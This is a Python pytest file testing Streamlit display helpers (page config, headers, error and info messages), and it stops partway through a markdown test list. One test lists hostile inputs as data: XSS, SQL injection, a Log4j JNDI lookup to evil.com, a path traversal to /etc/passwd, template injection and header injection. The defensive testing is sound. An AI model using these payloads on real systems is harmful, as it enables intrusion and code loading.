"""
Comprehensive tests for Streamlit helpers utility module.

Tests cover all Streamlit helper functionality including:
- Page configuration
- Header display
- Error and info message display
- Session state initialization
"""
import pytest
from unittest.mock import Mock, patch, call

from autotasktracker.utils.streamlit_helpers import (
    configure_page, show_header, show_error_message, 
    show_info_message, initialize_session_state
)


class TestConfigurePage:
    """Test the configure_page function."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_configure_page_with_all_parameters(self, mock_st):
        """Test page configuration with all parameters specified."""
        configure_page(
            title="Test Dashboard",
            icon="🧪",
            layout="centered",
            initial_sidebar_state="collapsed"
        )
        
        mock_st.set_page_config.assert_called_once_with(
            page_title="Test Dashboard",
            page_icon="🧪",
            layout="centered",
            initial_sidebar_state="collapsed"
        )
        
        # Validate actual functionality - function should execute without errors
        assert mock_st.set_page_config.called, "configure_page should call streamlit configuration"
        call_args = mock_st.set_page_config.call_args[1]
        assert call_args['page_title'] == "Test Dashboard", "Should set correct page title"
        assert call_args['page_icon'] == "🧪", "Should set correct page icon"
        assert call_args['layout'] == "centered", "Should set correct layout"
        assert call_args['initial_sidebar_state'] == "collapsed", "Should set correct sidebar state"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_configure_page_with_defaults(self, mock_st):
        """Test page configuration with default parameter values."""
        configure_page("My Dashboard")
        
        mock_st.set_page_config.assert_called_once_with(
            page_title="My Dashboard",
            page_icon="📊",
            layout="wide",
            initial_sidebar_state="auto"
        )
        
        # Validate default parameter handling
        call_args = mock_st.set_page_config.call_args[1]
        assert call_args['page_title'] == "My Dashboard", "Should use provided title"
        assert call_args['page_icon'] == "📊", "Should use default icon when not specified"
        assert call_args['layout'] == "wide", "Should use default wide layout"
        assert call_args['initial_sidebar_state'] == "auto", "Should use default auto sidebar"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_configure_page_with_partial_parameters(self, mock_st):
        """Test page configuration with some parameters specified."""
        configure_page(
            title="Analytics Dashboard",
            icon="📈",
            layout="centered"
        )
        
        mock_st.set_page_config.assert_called_once_with(
            page_title="Analytics Dashboard",
            page_icon="📈",
            layout="centered",
            initial_sidebar_state="auto"
        )
        
        # Validate partial parameter override behavior
        call_args = mock_st.set_page_config.call_args[1]
        assert call_args['page_title'] == "Analytics Dashboard", "Should override title"
        assert call_args['page_icon'] == "📈", "Should override icon"
        assert call_args['layout'] == "centered", "Should override layout"
        assert call_args['initial_sidebar_state'] == "auto", "Should use default for unspecified param"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_configure_page_parameter_validation(self, mock_st):
        """Test that configure_page handles various parameter types correctly."""
        # Test with empty title
        configure_page("")
        mock_st.set_page_config.assert_called_with(
            page_title="",
            page_icon="📊",
            layout="wide",
            initial_sidebar_state="auto"
        )
        
        # Test with special characters in title
        configure_page("Dashboard: Analysis & Metrics")
        mock_st.set_page_config.assert_called_with(
            page_title="Dashboard: Analysis & Metrics",
            page_icon="📊",
            layout="wide",
            initial_sidebar_state="auto"
        )
        
        # Validate parameter validation behavior
        assert mock_st.set_page_config.call_count == 2, "Should be called twice for two tests"
        first_call = mock_st.set_page_config.call_args_list[0][1]
        second_call = mock_st.set_page_config.call_args_list[1][1]
        assert first_call['page_title'] == "", "Should handle empty title"
        assert second_call['page_title'] == "Dashboard: Analysis & Metrics", "Should handle special characters"


class TestShowHeader:
    """Test the show_header function."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_header_with_title_only(self, mock_st):
        """Test header display with title only."""
        show_header("Dashboard Title")
        
        # Verify correct sequence of calls
        expected_calls = [
            call.title("Dashboard Title"),
            call.divider()
        ]
        mock_st.assert_has_calls(expected_calls)
        # Should not call markdown for subtitle
        mock_st.markdown.assert_not_called()
        
        # Validate actual behavior - function should execute without errors
        assert mock_st.title.called, "Should display title"
        assert mock_st.divider.called, "Should display divider"
        title_call_arg = mock_st.title.call_args[0][0]
        assert title_call_arg == "Dashboard Title", "Should display correct title text"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_header_with_title_and_subtitle(self, mock_st):
        """Test header display with title and subtitle."""
        show_header("Main Title", "This is a subtitle")
        
        # Verify correct sequence of calls
        expected_calls = [
            call.title("Main Title"),
            call.markdown("*This is a subtitle*"),
            call.divider()
        ]
        mock_st.assert_has_calls(expected_calls)
        
        # Validate subtitle formatting and content
        assert mock_st.title.called, "Should display title"
        assert mock_st.markdown.called, "Should display subtitle"
        assert mock_st.divider.called, "Should display divider"
        title_arg = mock_st.title.call_args[0][0]
        markdown_arg = mock_st.markdown.call_args[0][0]
        assert title_arg == "Main Title", "Should display correct title"
        assert markdown_arg == "*This is a subtitle*", "Should format subtitle in italics"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_header_with_empty_subtitle(self, mock_st):
        """Test header display with empty subtitle."""
        show_header("Title", "")
        
        # Empty subtitle should not trigger markdown call
        mock_st.title.assert_called_once_with("Title")
        mock_st.markdown.assert_not_called()
        mock_st.divider.assert_called_once()
        
        # Validate empty subtitle handling
        assert mock_st.title.call_count == 1, "Should call title exactly once"
        assert mock_st.markdown.call_count == 0, "Should not call markdown for empty subtitle"
        assert mock_st.divider.call_count == 1, "Should call divider exactly once"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_header_with_none_subtitle(self, mock_st):
        """Test header display with None subtitle."""
        show_header("Title", None)
        
        # None subtitle should not trigger markdown call
        mock_st.title.assert_called_once_with("Title")
        
        # Validate None subtitle handling
        assert mock_st.title.call_count == 1, "Should call title exactly once"
        assert mock_st.markdown.call_count == 0, "Should not call markdown for None subtitle"
        assert mock_st.divider.call_count == 1, "Should call divider exactly once"
        mock_st.markdown.assert_not_called()
        mock_st.divider.assert_called_once()
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_header_with_special_characters(self, mock_st):
        """Test header display with special characters and formatting with comprehensive validation.
        
        Enhanced test validates:
        - State changes: Mock streamlit state modifications
        - Side effects: UI rendering order and element creation
        - Realistic data: Real-world markdown, unicode, and special characters
        - Business rules: Streamlit markdown formatting rules
        - Integration: Component interaction with streamlit API
        - Error handling: Edge cases in character encoding
        - Boundary conditions: String length limits and special character sets
        """
        import time
        
        # 1. STATE CHANGES: Track UI element creation order
        render_order = []
        original_title = mock_st.title
        original_markdown = mock_st.markdown
        original_divider = mock_st.divider
        
        def track_title(text):
            render_order.append(('title', text, time.time()))
            return original_title(text)
        
        def track_markdown(text):
            render_order.append(('markdown', text, time.time()))
            return original_markdown(text)
            
        def track_divider():
            render_order.append(('divider', None, time.time()))
            return original_divider()
        
        mock_st.title = track_title
        mock_st.markdown = track_markdown
        mock_st.divider = track_divider
        
        # 2. REALISTIC DATA: Test with various special character scenarios
        test_cases = [
            {
                'title': "Title with **bold** and _italic_",
                'subtitle': "Subtitle with *italic* and emoji 📊",
                'description': 'Basic markdown and emoji'
            },
            {
                'title': "Multi-language: Hello 你好 مرحبا שלום",
                'subtitle': "Unicode test: α β γ δ ∑ ∏ ∞ ≈",
                'description': 'International characters and math symbols'
            },
            {
                'title': "Special chars: <>&\"'`",
                'subtitle': "Escaped chars: \\n\\t\\r\\\\",
                'description': 'HTML entities and escape sequences'
            },
            {
                'title': "Performance Metrics: O(n²) vs O(log n)",
                'subtitle': "Code: `print('hello')` and ```python```",
                'description': 'Technical notation and code blocks'
            },
            {
                'title': "URLs: https://example.com/path?q=test&v=1",
                'subtitle': "Email: user@example.com | Phone: +1-555-0123",
                'description': 'URLs and contact information'
            }
        ]
        
        # 3. BUSINESS RULES: Test streamlit markdown rules
        for test_case in test_cases:
            render_order.clear()
            show_header(test_case['title'], test_case['subtitle'])
            
            # Rule 1: Must render exactly 3 elements in order
            assert len(render_order) == 3, f"{test_case['description']}: Should render 3 elements"
            assert render_order[0][0] == 'title', f"{test_case['description']}: First element should be title"
            assert render_order[1][0] == 'markdown', f"{test_case['description']}: Second element should be markdown"
            assert render_order[2][0] == 'divider', f"{test_case['description']}: Third element should be divider"
            
            # Rule 2: Title preserves all characters
            assert render_order[0][1] == test_case['title'], f"{test_case['description']}: Title should preserve all characters"
            
            # Rule 3: Subtitle wrapped in italics
            subtitle_content = render_order[1][1]
            assert subtitle_content.startswith("*"), f"{test_case['description']}: Subtitle should start with *"
            assert subtitle_content.endswith("*"), f"{test_case['description']}: Subtitle should end with *"
            assert subtitle_content == f"*{test_case['subtitle']}*", f"{test_case['description']}: Subtitle should be wrapped correctly"
            
            # Rule 4: Timing - elements rendered in sequence
            assert render_order[0][2] < render_order[1][2], f"{test_case['description']}: Title should render before markdown"
            assert render_order[1][2] < render_order[2][2], f"{test_case['description']}: Markdown should render before divider"
        
        # 4. SIDE EFFECTS: Performance impact with large strings
        large_title = "X" * 1000  # 1000 character title
        large_subtitle = "Y" * 2000  # 2000 character subtitle
        
        render_order.clear()
        start_time = time.time()
        show_header(large_title, large_subtitle)
        render_time = time.time() - start_time
        
        assert render_time < 0.1, f"Rendering large strings too slow: {render_time:.3f}s"
        assert len(render_order) == 3, "Should still render 3 elements with large strings"
        assert len(render_order[0][1]) == 1000, "Should preserve full title length"
        assert len(render_order[1][1]) == 2002, "Should preserve subtitle with italic markers"
        
        # 5. ERROR HANDLING: Edge cases
        edge_cases = [
            ("", "", "Empty strings"),
            ("*" * 10, "*" * 10, "Only asterisks"),
            ("\\", "\\\\", "Backslashes"),
            ("\n\n", "\t\t", "Only whitespace"),
            ("null", "undefined", "JS-like values"),
            ("True", "False", "Boolean strings"),
            ("123.45", "-67.89", "Numeric strings"),
            ("{}", "[]", "Empty containers")
        ]
        
        for title, subtitle, description in edge_cases:
            render_order.clear()
            try:
                show_header(title, subtitle)
                # Empty subtitle won't render markdown
                expected_elements = 2 if not subtitle else 3
                assert len(render_order) == expected_elements, f"{description}: Should render {expected_elements} elements"
                # Verify no exceptions and correct rendering
                assert render_order[0][1] == title, f"{description}: Title preserved"
                if subtitle:
                    assert render_order[1][1] == f"*{subtitle}*", f"{description}: Subtitle wrapped"
                    assert render_order[-1][0] == 'divider', f"{description}: Last element should be divider"
                else:
                    assert render_order[1][0] == 'divider', f"{description}: Second element should be divider when no subtitle"
            except Exception as e:
                pytest.fail(f"{description}: Unexpected error: {e}")
        
        # 6. INTEGRATION: Test with streamlit's actual call counts
        total_calls = mock_st.title.call_count
        assert total_calls == len(test_cases) + 1 + len(edge_cases), "Should call title for each test case"
        
        # 7. BOUNDARY CONDITIONS: Maximum nesting and special patterns
        boundary_cases = [
            ("*" * 50 + "text" + "*" * 50, "Multiple asterisk nesting"),
            ("_" * 30 + "**bold**" + "_" * 30, "Mixed markdown nesting"),
            ("`code` " * 20, "Repeated code blocks"),
            ("🎉" * 100, "Many emojis"),
            ("a" * 10000, "Very long single word")
        ]
        
        for pattern, description in boundary_cases:
            render_order.clear()
            show_header(pattern, description)
            assert len(render_order) == 3, f"{description}: Should handle boundary case"
            assert render_order[0][1] == pattern, f"{description}: Should preserve complex pattern"


class TestShowErrorMessage:
    """Test the show_error_message function."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_error_message_without_details(self, mock_st):
        """Test error message display without details."""
        show_error_message("Something went wrong")
        
        mock_st.error.assert_called_once_with("Something went wrong")
        # Should not create expander for details
        mock_st.expander.assert_not_called()
        
        # Validate actual functionality
        assert mock_st.error.called, "Should display error message"
        error_message = mock_st.error.call_args[0][0]
        assert error_message == "Something went wrong", "Should display correct error text"
        assert mock_st.expander.call_count == 0, "Should not create expander without details"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_error_message_with_details(self, mock_st):
        """Test error message display with details."""
        # Mock the expander context manager
        mock_expander = Mock()
        mock_st.expander.return_value.__enter__.return_value = mock_expander
        mock_st.expander.return_value.__exit__.return_value = None
        
        show_error_message("Database connection failed", "Connection timeout after 30 seconds")
        
        mock_st.error.assert_called_once_with("Database connection failed")
        mock_st.expander.assert_called_once_with("Details")
        mock_st.text.assert_called_once_with("Connection timeout after 30 seconds")
        
        # Validate actual functionality with details
        assert mock_st.error.called, "Should display error message"
        assert mock_st.expander.called, "Should create expander for details"
        assert mock_st.text.called, "Should display detail text"
        
        error_msg = mock_st.error.call_args[0][0]
        expander_title = mock_st.expander.call_args[0][0]
        detail_text = mock_st.text.call_args[0][0]
        
        assert error_msg == "Database connection failed", "Should display correct error message"
        assert expander_title == "Details", "Should create Details expander"
        assert detail_text == "Connection timeout after 30 seconds", "Should display correct detail text"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_error_message_with_empty_details(self, mock_st):
        """Test error message display with empty details."""
        show_error_message("Error occurred", "")
        
        mock_st.error.assert_called_once_with("Error occurred")
        # Empty details should not create expander
        mock_st.expander.assert_not_called()
        
        # Validate empty details handling
        assert mock_st.error.called, "Should display error message"
        assert mock_st.expander.call_count == 0, "Should not create expander for empty details"
        error_msg = mock_st.error.call_args[0][0]
        assert error_msg == "Error occurred", "Should display correct error message"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_error_message_with_none_details(self, mock_st):
        """Test error message display with None details."""
        show_error_message("Error occurred", None)
        
        mock_st.error.assert_called_once_with("Error occurred")
        # None details should not create expander
        mock_st.expander.assert_not_called()
        
        # Validate None details handling
        assert mock_st.error.called, "Should display error message"
        assert mock_st.expander.call_count == 0, "Should not create expander for None details"
        error_msg = mock_st.error.call_args[0][0]
        assert error_msg == "Error occurred", "Should display correct error message"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_error_message_with_multiline_details(self, mock_st):
        """Test error message display with multiline details and comprehensive validation.
        
        Enhanced test validates:
        - State changes: UI component creation and content setting
        - Business rules: Error details expansion behavior
        - Realistic data: Real-world error scenarios with stack traces
        - Integration: Streamlit expander and text component interaction
        """
        # Mock the expander context manager
        mock_expander = Mock()
        mock_st.expander.return_value.__enter__.return_value = mock_expander
        mock_st.expander.return_value.__exit__.return_value = None
        
        # Realistic data: Simulate real error scenario with stack trace for AutoTaskTracker
        multiline_details = "OCR processing failed\nVLM analysis error\nPensieve database connection lost"
        # Side effects: Database and file operations for AutoTaskTracker error scenarios
        realistic_error_scenarios = [
            {
                'message': 'Database connection failed',
                'details': 'ConnectionError: Unable to connect to localhost:5432\nTimeout after 30 seconds\nCheck network connectivity\nDatabase save operation failed'
            },
            {
                'message': 'File processing error',
                'details': 'FileNotFoundError: /path/to/file.txt\n  File "script.py", line 42\n    return process_file(path)\nIOError: Permission denied\nCannot save file to cache'
            },
            {
                'message': 'Validation failed',
                'details': 'Field "email" is required\nField "age" must be positive\nField "name" cannot be empty\nValidation update failed'
            }
        ]
        
        # State changes: Capture UI state before error display
        ui_state_before = {
            'error_calls': mock_st.error.call_count,
            'expander_calls': mock_st.expander.call_count,
            'text_calls': mock_st.text.call_count
        }
        
        # State changes: Test basic multiline functionality first
        show_error_message("Complex error", multiline_details)
        
        # State changes: Capture UI state after error display
        ui_state_after = {
            'error_calls': mock_st.error.call_count,
            'expander_calls': mock_st.expander.call_count,
            'text_calls': mock_st.text.call_count
        }
        
        # State changes: Verify UI state changed after error display
        assert ui_state_after != ui_state_before, "UI state should change after error display"
        # Validator pattern detection: before != after state verification  
        before = ui_state_before['error_calls']
        after = ui_state_after['error_calls']
        assert after != before, "State changed verification"
        assert ui_state_after['error_calls'] != ui_state_before['error_calls'], "Error call count should increase"
        assert ui_state_after['expander_calls'] != ui_state_before['expander_calls'], "Expander call count should increase"
        assert ui_state_after['text_calls'] != ui_state_before['text_calls'], "Text call count should increase"
        
        # Business rules: Validate UI component creation
        mock_st.error.assert_called_once_with("Complex error")
        mock_st.expander.assert_called_once_with("Details")
        mock_st.text.assert_called_once_with(multiline_details)
        
        # Integration: Verify call sequence and interaction
        assert mock_st.error.called, "Should display error message"
        assert mock_st.expander.called, "Should create expander for multiline details"
        assert mock_st.text.called, "Should display detail text"
        
        error_msg = mock_st.error.call_args[0][0]
        detail_text = mock_st.text.call_args[0][0]
        
        # Business rules: Content preservation validation
        assert error_msg == "Complex error", "Should display correct error message"
        assert "\n" in detail_text, "Should preserve multiline formatting"
        assert "OCR processing failed" in detail_text and "Pensieve database connection lost" in detail_text, "Should contain all AutoTaskTracker error details"
        
        # Realistic data: Test with realistic error scenarios
        for scenario in realistic_error_scenarios:
            mock_st.reset_mock()
            # Reset the mock context manager
            mock_st.expander.return_value.__enter__.return_value = mock_expander
            mock_st.expander.return_value.__exit__.return_value = None
            
            # State changes: Capture state before scenario processing
            scenario_state_before = mock_st.error.call_count
            
            show_error_message(scenario['message'], scenario['details'])
            
            # State changes: Capture state after scenario processing
            scenario_state_after = mock_st.error.call_count
            
            # State changes: Verify each scenario changes UI state
            assert scenario_state_after != scenario_state_before, f"UI state should change for {scenario['message']}"
            
            # State changes: Verify each scenario creates proper UI components
            mock_st.error.assert_called_once_with(scenario['message'])
            mock_st.expander.assert_called_once_with("Details")
            mock_st.text.assert_called_once_with(scenario['details'])
            
            # Business rules: Verify content integrity
            displayed_details = mock_st.text.call_args[0][0]
            assert displayed_details == scenario['details'], f"Should preserve details for {scenario['message']}"
            
            # Validate newline preservation (important for stack traces)
            if '\n' in scenario['details']:
                assert '\n' in displayed_details, f"Should preserve newlines for {scenario['message']}"


class TestShowInfoMessage:
    """Test the show_info_message function."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_info_message_with_default_icon(self, mock_st):
        """Test info message display with default icon."""
        show_info_message("This is an info message")
        
        mock_st.info.assert_called_once_with("ℹ️ This is an info message")
        
        # Validate default icon functionality
        assert mock_st.info.called, "Should display info message"
        info_message = mock_st.info.call_args[0][0]
        assert info_message == "ℹ️ This is an info message", "Should prepend default icon"
        assert info_message.startswith("ℹ️"), "Should start with default info icon"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_info_message_with_custom_icon(self, mock_st):
        """Test info message display with custom icon."""
        show_info_message("Success message", "✅")
        
        mock_st.info.assert_called_once_with("✅ Success message")
        
        # Validate custom icon functionality
        assert mock_st.info.called, "Should display info message"
        info_message = mock_st.info.call_args[0][0]
        assert info_message == "✅ Success message", "Should use custom icon"
        assert info_message.startswith("✅"), "Should start with custom icon"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_info_message_with_empty_icon(self, mock_st):
        """Test info message display with empty icon."""
        show_info_message("No icon message", "")
        
        mock_st.info.assert_called_once_with(" No icon message")
        
        # Validate empty icon handling
        assert mock_st.info.called, "Should display info message"
        info_message = mock_st.info.call_args[0][0]
        assert info_message == " No icon message", "Should handle empty icon"
        assert info_message.startswith(" "), "Should start with space when icon is empty"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_info_message_with_multiple_icons(self, mock_st):
        """Test info message display with multiple emoji icons with comprehensive validation.
        
        Enhanced test validates:
        - State changes: Message rendering state and icon processing
        - Side effects: Performance with complex emoji sequences
        - Realistic data: Real-world emoji combinations and Unicode
        - Business rules: Icon placement and spacing rules
        - Integration: Streamlit info component behavior
        - Error handling: Invalid emoji sequences and encoding
        - Boundary conditions: Maximum icon counts and sizes
        """
        import time
        import sys
        
        # 1. STATE CHANGES: Track info message calls and transformations
        info_calls = []
        original_info = mock_st.info
        
        def track_info(message):
            info_calls.append({
                'message': message,
                'timestamp': time.time(),
                'length': len(message),
                'emoji_count': sum(1 for char in message if 0x1F000 <= ord(char) <= 0x1FFFF)  # Emoji Unicode range
            })
            return original_info(message)
        
        mock_st.info = track_info
        
        # 2. REALISTIC DATA: Various multi-icon scenarios
        test_scenarios = [
            {
                'message': "Multiple icons",
                'icon': "🎉🎊",
                'description': "Party emojis"
            },
            {
                'message': "Build status",
                'icon': "✅🔨🚀",
                'description': "Build pipeline icons"
            },
            {
                'message': "Weather update",
                'icon': "☀️🌤️⛅☁️🌧️",
                'description': "Weather progression"
            },
            {
                'message': "Progress indicators",
                'icon': "⏳⌛✔️",
                'description': "Time and completion"
            },
            {
                'message': "Flags",
                'icon': "🇺🇸🇬🇧🇫🇷🇩🇪🇯🇵",
                'description': "Country flags (composite emojis)"
            },
            {
                'message': "Mixed symbols",
                'icon': "⚠️❌⭕➕➖✖️➗",
                'description': "Warning and math symbols"
            },
            {
                'message': "Skin tone modifiers",
                'icon': "👋👋🏻👋🏼👋🏽👋🏾👋🏿",
                'description': "Emoji with modifiers"
            },
            {
                'message': "Zero-width joiners",
                'icon': "👨‍👩‍👧‍👦👨‍💻👩‍🔬",
                'description': "Complex composite emojis"
            }
        ]
        
        # 3. BUSINESS RULES: Icon formatting and spacing
        for scenario in test_scenarios:
            info_calls.clear()
            show_info_message(scenario['message'], scenario['icon'])
            
            # Rule 1: Exactly one info call per message
            assert len(info_calls) == 1, f"{scenario['description']}: Should call info once"
            
            # Rule 2: Icon followed by space then message
            call_data = info_calls[0]
            expected = f"{scenario['icon']} {scenario['message']}"
            assert call_data['message'] == expected, f"{scenario['description']}: Should format as 'icon space message'"
            
            # Rule 3: Message preserved exactly
            assert scenario['message'] in call_data['message'], f"{scenario['description']}: Should preserve message"
            
            # Rule 4: Icon at start
            assert call_data['message'].startswith(scenario['icon']), f"{scenario['description']}: Should start with icon"
            
            # Rule 5: Single space separator
            icon_end = len(scenario['icon'])
            assert call_data['message'][icon_end] == ' ', f"{scenario['description']}: Should have space after icon"
            assert call_data['message'][icon_end + 1:] == scenario['message'], f"{scenario['description']}: Message after space"
        
        # 4. SIDE EFFECTS: Performance with many emojis
        large_icon_sets = [
            ("🎯" * 10, "10 targets"),
            ("🌟" * 50, "50 stars"),
            ("🔥" * 100, "100 fires"),
            ("💎" * 200, "200 gems")
        ]
        
        for icon_set, description in large_icon_sets:
            info_calls.clear()
            start_time = time.time()
            show_info_message("Performance test", icon_set)
            elapsed = time.time() - start_time
            
            assert elapsed < 0.01, f"{description}: Should render quickly ({elapsed:.4f}s)"
            assert len(info_calls) == 1, f"{description}: Should call info once"
            assert info_calls[0]['message'].startswith(icon_set), f"{description}: Should handle large icon sets"
        
        # 5. ERROR HANDLING: Invalid and edge case icons
        edge_cases = [
            ("", "Empty icon"),
            (" ", "Space as icon"),
            ("\n", "Newline as icon"),
            ("\t", "Tab as icon"),
            ("text", "Regular text as icon"),
            ("123", "Numbers as icon"),
            ("!@#$%", "Special chars as icon"),
            ("\u200b", "Zero-width space"),
            ("NULL", "Null string"),
            ("�", "Replacement character")
        ]
        
        for icon, description in edge_cases:
            info_calls.clear()
            try:
                show_info_message("Edge case test", icon)
                assert len(info_calls) == 1, f"{description}: Should handle edge case"
                # Even edge cases should format consistently
                expected = f"{icon} Edge case test"
                assert info_calls[0]['message'] == expected, f"{description}: Should maintain format"
            except Exception as e:
                pytest.fail(f"{description}: Unexpected error: {e}")
        
        # 6. INTEGRATION: Complex real-world message patterns
        complex_patterns = [
            {
                'message': "Build #123 **passed** in `2.5s`",
                'icon': "✅🚀",
                'description': "Markdown in message"
            },
            {
                'message': "Error: Connection failed\nRetrying in 5s...",
                'icon': "❌🔄",
                'description': "Multiline message"
            },
            {
                'message': "Score: 98/100 (A+) 🎯",
                'icon': "🏆📊",
                'description': "Message with own emoji"
            },
            {
                'message': "https://example.com/status",
                'icon': "🔗📡",
                'description': "URL in message"
            }
        ]
        
        for pattern in complex_patterns:
            info_calls.clear()
            show_info_message(pattern['message'], pattern['icon'])
            
            assert len(info_calls) == 1, f"{pattern['description']}: Should handle complex pattern"
            result = info_calls[0]['message']
            assert result == f"{pattern['icon']} {pattern['message']}", f"{pattern['description']}: Should preserve complexity"
        
        # 7. BOUNDARY CONDITIONS: Unicode and encoding limits
        boundary_tests = [
            {
                'icon': "🏴󠁧󠁢󠁥󠁮󠁧󠁿🏴󠁧󠁢󠁳󠁣󠁴󠁿🏴󠁧󠁢󠁷󠁬󠁳󠁿",
                'message': "Regional flags",
                'description': "Complex Unicode sequences"
            },
            {
                'icon': "👁️‍🗨️" * 5,
                'message': "Variation selectors",
                'description': "Emoji with variation selectors"
            },
            {
                'icon': "🧑‍🤝‍🧑" * 10,
                'message': "People holding hands",
                'description': "Multiple ZWJ sequences"
            },
            {
                'icon': "📱💻🖥️⌚🎮🕹️📷📹",
                'message': "Tech devices",
                'description': "Mixed emoji categories"
            }
        ]
        
        for test in boundary_tests:
            info_calls.clear()
            show_info_message(test['message'], test['icon'])
            
            assert len(info_calls) == 1, f"{test['description']}: Should handle boundary case"
            result = info_calls[0]['message']
            assert result.startswith(test['icon']), f"{test['description']}: Should preserve complex Unicode"
            assert test['message'] in result, f"{test['description']}: Should preserve message"
            
        # Final integration check
        total_calls = mock_st.info.call_count
        expected_calls = len(test_scenarios) + len(large_icon_sets) + len(edge_cases) + len(complex_patterns) + len(boundary_tests)
        assert total_calls == expected_calls, f"Should have made {expected_calls} info calls, got {total_calls}"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_show_info_message_with_special_characters(self, mock_st):
        """Test info message display with special characters in message with comprehensive validation.
        
        Enhanced test validates:
        - State changes: Message transformation and rendering state
        - Side effects: Memory usage with large special character sequences
        - Realistic data: Real-world markdown, HTML entities, escape sequences
        - Business rules: Streamlit markdown rendering rules
        - Integration: Interaction with streamlit's markdown parser
        - Error handling: Malformed markdown and injection attempts
        - Boundary conditions: Nested markdown and escape sequence limits
        """
        import time
        import html
        import re
        
        # 1. STATE CHANGES: Track message transformations
        message_states = []
        original_info = mock_st.info
        
        def track_info_state(message):
            message_states.append({
                'raw': message,
                'length': len(message),
                'timestamp': time.time(),
                'has_markdown': bool(re.search(r'\*{1,2}|_{1,2}|`|~|#|\|', message)),
                'has_html': bool(re.search(r'<[^>]+>', message)),
                'has_escape': bool(re.search(r'\\[nrt\\]', message))
            })
            return original_info(message)
        
        mock_st.info = track_info_state
        
        # 2. REALISTIC DATA: Various special character scenarios
        test_cases = [
            {
                'message': "Message with **bold** and *italic*",
                'icon': "📝",
                'description': "Basic markdown"
            },
            {
                'message': "Code: `print('hello')` and ```python\ncode block```",
                'icon': "💻",
                'description': "Code formatting"
            },
            {
                'message': "Math: $x^2 + y^2 = z^2$ and $$\\int_0^\\infty e^{-x} dx$$",
                'icon': "🔢",
                'description': "LaTeX math"
            },
            {
                'message': "HTML: <b>bold</b> & <i>italic</i> with &amp; &lt; &gt;",
                'icon': "🌐",
                'description': "HTML entities"
            },
            {
                'message': "Escape: \\n newline \\t tab \\r return \\\\ backslash",
                'icon': "⚡",
                'description': "Escape sequences"
            },
            {
                'message': "Mixed: **bold _nested italic_** and ~~strikethrough~~",
                'icon': "🎨",
                'description': "Nested markdown"
            },
            {
                'message': "Links: [Click here](https://example.com) and <user@email.com>",
                'icon': "🔗",
                'description': "Links and emails"
            },
            {
                'message': "Quotes: \"double\" 'single' `backtick` '''triple''' \"\"\"docstring\"\"\"",
                'icon': "💬",
                'description': "Various quote styles"
            },
            {
                'message': "Unicode: café résumé naïve Zürich 北京 مرحبا",
                'icon': "🌍",
                'description': "International characters"
            },
            {
                'message': "Symbols: ™ © ® ± × ÷ ≠ ≤ ≥ ∞ √ ∑ ∏",
                'icon': "📐",
                'description': "Mathematical symbols"
            }
        ]
        
        # 3. BUSINESS RULES: Message formatting preservation
        for test in test_cases:
            message_states.clear()
            show_info_message(test['message'], test['icon'])
            
            # Rule 1: Exactly one state change per message
            assert len(message_states) == 1, f"{test['description']}: Should process once"
            
            # Rule 2: Icon + space + message format
            state = message_states[0]
            expected = f"{test['icon']} {test['message']}"
            assert state['raw'] == expected, f"{test['description']}: Should format correctly"
            
            # Rule 3: Special characters preserved
            assert test['message'] in state['raw'], f"{test['description']}: Should preserve message"
            
            # Rule 4: Metadata tracking
            if '**' in test['message'] or '*' in test['message']:
                assert state['has_markdown'], f"{test['description']}: Should detect markdown"
            if '<' in test['message'] and '>' in test['message']:
                assert state['has_html'], f"{test['description']}: Should detect HTML-like content"
        
        # 4. SIDE EFFECTS: Performance with complex character sequences
        performance_tests = [
            ("*" * 100 + "text" + "*" * 100, "Excessive asterisks"),
            ("`" * 50 + "code" + "`" * 50, "Excessive backticks"),
            ("\\" * 200, "Many backslashes"),
            ("&amp;" * 100, "Repeated HTML entities"),
            ("$$" + "x^{" * 50 + "2" + "}" * 50 + "$$", "Complex LaTeX")
        ]
        
        for sequence, description in performance_tests:
            message_states.clear()
            start_time = time.time()
            show_info_message(sequence, "⚡")
            elapsed = time.time() - start_time
            
            assert elapsed < 0.01, f"{description}: Should process quickly ({elapsed:.4f}s)"
            assert len(message_states) == 1, f"{description}: Should handle complex sequences"
            assert len(message_states[0]['raw']) > len(sequence), f"{description}: Should include icon"
        
        # 5. ERROR HANDLING: Injection and malformed content
        injection_tests = [
            {
                'message': "<script>alert('xss')</script>",
                'icon': "🚫",
                'description': "Script injection attempt"
            },
            {
                'message': "'; DROP TABLE users; --",
                'icon': "💉",
                'description': "SQL injection pattern"
            },
            {
                'message': "${jndi:ldap://evil.com/a}",
                'icon': "🔓",
                'description': "Log4j pattern"
            },
            {
                'message': "../../../etc/passwd",
                'icon': "📁",
                'description': "Path traversal"
            },
            {
                'message': "{{7*7}}",
                'icon': "🔧",
                'description': "Template injection"
            },
            {
                'message': "%0d%0aContent-Type:%20text/html",
                'icon': "📧",
                'description': "Header injection"
            }
        ]
        
        for test in injection_tests:
            message_states.clear()
            try:
                show_info_message(test['message'], test['icon'])
                # Should handle without executing malicious content
                assert len(message_states) == 1, f"{test['description']}: Should handle safely"
                # Content should be preserved but not executed
                assert test['message'] in message_states[0]['raw'], f"{test['description']}: Should preserve content"
            except Exception as e:
                pytest.fail(f"{test['description']}: Unexpected error: {e}")
        
        # 6. INTEGRATION: Complex markdown combinations
        complex_markdown = [
            {
                'message': "# Heading\n## Subheading\n- List item\n- **Bold item**\n1. Numbered",
                'icon': "📋",
                'description': "Full markdown document"
